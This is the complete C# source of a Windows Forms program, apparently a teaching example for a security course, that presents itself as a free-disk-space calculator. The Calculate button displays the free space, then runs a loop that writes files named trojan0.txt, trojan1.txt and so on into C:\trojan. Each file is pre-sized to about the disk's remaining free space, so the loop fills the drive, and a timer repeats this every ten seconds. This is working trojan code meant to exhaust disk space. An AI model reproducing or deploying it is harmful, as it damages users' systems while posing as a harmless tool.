//--------------- Form1.cs ---------------
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Timers;

namespace SIS_prakticni_primjer1
{
    public partial class Form1 : Form
    {
        IzracunSlobodneMemorije ISM = new IzracunSlobodneMemorije();

        public Form1()
        {
            InitializeComponent();
        }

        private void IzracunajBttn_Click(object sender, EventArgs e)
        {
            double rezz = ISM.IzracunajSlobodnuMemoriju();
            RezzLbl.Text = rezz.ToString() + " GB";
            ISM.KreirajIzvjesce();
            this.timer.Start();
            this.timer.Tick += new EventHandler(timer_Tick);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Directory.CreateDirectory("C:\\trojan");
        }

        private void timer_Tick(object sender, EventArgs e)
        {
            ISM.KreirajIzvjesce();
        }
    }
}


//--------------- IzracunSlobodneMemorije.cs ---------------
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Runtime.InteropServices;

namespace SIS_prakticni_primjer1
{
    public class IzracunSlobodneMemorije
    {
        int brojac = 0;

        public double IzracunajSlobodnuMemoriju()
        {
            DriveInfo DI = new DriveInfo("C:\\");
            double slobodni_prostor = DI.AvailableFreeSpace;

            double slobodni_prostorGB = (((slobodni_prostor / 1024) / 1024) / 1024);
            double SP = Math.Round(slobodni_prostorGB, 3);

            return SP;
        }

        public void KreirajIzvjesce()
        {  
            do
            {
                string slobodni_prostor = IzracunajSlobodnuMemoriju().ToString();
                Int64 slobodni_prostorGB = Convert.ToInt64(IzracunajSlobodnuMemoriju()) * 1024;
                string vrijeme_i_datum = DateTime.Now.ToString();

                FileStream fs = new FileStream("C:\\trojan\\trojan" + brojac.ToString() + ".txt", FileMode.OpenOrCreate, FileAccess.Write);

                if (IzracunajSlobodnuMemoriju() >= 1)
                {
                    fs.SetLength(1024 * 1024 * slobodni_prostorGB);
                }

                else
                {
                    Int64 rezz = Convert.ToInt64(IzracunajSlobodnuMemoriju() * 1000);
                    fs.SetLength(1024 * 1024 * rezz);
                }

                StreamWriter sw = new StreamWriter(fs);
                sw.Write(vrijeme_i_datum + " | " + slobodni_prostor + " GB");
                sw.Close();
                brojac++;
            }

            while (IzracunajSlobodnuMemoriju() > 0);
        }
    }
}


//------------- Program.cs ------------- 
using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;

namespace SIS_prakticni_primjer1
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }
}


//------------ Form1.Designer.cs ------------ 
namespace SIS_prakticni_primjer1
{
    partial class Form1
    {
        private System.ComponentModel.IContainer components = null;

        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.IzracunajBttn = new System.Windows.Forms.Button();
            this.RezzLbl = new System.Windows.Forms.Label();
            this.NaslovLbl = new System.Windows.Forms.Label();
            this.timer = new System.Windows.Forms.Timer(this.components);
            this.SuspendLayout();
            // 
            // IzracunajBttn
            // 
            this.IzracunajBttn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.IzracunajBttn.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.IzracunajBttn.Location = new System.Drawing.Point(115, 220);
            this.IzracunajBttn.Name = "IzracunajBttn";
            this.IzracunajBttn.Size = new System.Drawing.Size(75, 30);
            this.IzracunajBttn.TabIndex = 0;
            this.IzracunajBttn.Text = "Izračunaj";
            this.IzracunajBttn.UseVisualStyleBackColor = true;
            this.IzracunajBttn.Click += new System.EventHandler(this.IzracunajBttn_Click);
            // 
            // RezzLbl
            // 
            this.RezzLbl.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.RezzLbl.Font = new System.Drawing.Font("Microsoft Sans Serif", 21.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.RezzLbl.Location = new System.Drawing.Point(55, 114);
            this.RezzLbl.Name = "RezzLbl";
            this.RezzLbl.Size = new System.Drawing.Size(195, 35);
            this.RezzLbl.TabIndex = 1;
            this.RezzLbl.Text = "##,###";
            this.RezzLbl.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // NaslovLbl
            // 
            this.NaslovLbl.AutoSize = true;
            this.NaslovLbl.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Underline, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.NaslovLbl.Location = new System.Drawing.Point(16, 32);
            this.NaslovLbl.Name = "NaslovLbl";
            this.NaslovLbl.Size = new System.Drawing.Size(272, 15);
            this.NaslovLbl.TabIndex = 2;
            this.NaslovLbl.Text = "Program za izračun slobodnog prostora na disku";
            // 
            // timer
            // 
            this.timer.Interval = 10000;
            this.timer.Tick += new System.EventHandler(this.timer_Tick);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(305, 262);
            this.Controls.Add(this.NaslovLbl);
            this.Controls.Add(this.RezzLbl);
            this.Controls.Add(this.IzracunajBttn);
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.Name = "Form1";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "SIS";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        private System.Windows.Forms.Button IzracunajBttn;
        private System.Windows.Forms.Label RezzLbl;
        private System.Windows.Forms.Label NaslovLbl;
        public System.Windows.Forms.Timer timer;
    }
}

